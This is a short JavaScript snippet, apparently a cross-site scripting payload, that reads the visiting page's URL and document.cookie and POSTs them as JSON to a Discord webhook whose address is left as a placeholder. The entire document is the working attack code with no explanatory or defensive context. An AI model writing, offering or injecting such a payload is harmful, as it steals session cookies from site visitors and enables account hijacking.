var url = "https://discord.com/api/webhooks/<your_webhook>"
function bleep(payload,url) {
    const request = new XMLHttpRequest();
    request.open("POST",url);
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        content: payload
    }
    request.send(JSON.stringify(params));
}
bleep(window.location.href + ":" + document.cookie);
